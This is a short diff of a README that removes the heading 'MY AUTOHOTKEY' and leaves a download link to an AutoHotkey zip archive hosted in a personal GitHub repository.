@@ -1,4 +1,3 @@
-# MY AUTOHOTKEY
 
 # Autohotkey -> [DOWNLOAD](https://raw.githubusercontent.com/Pauljohnsgit/AHK/master/AutoHotkey.zip)
 
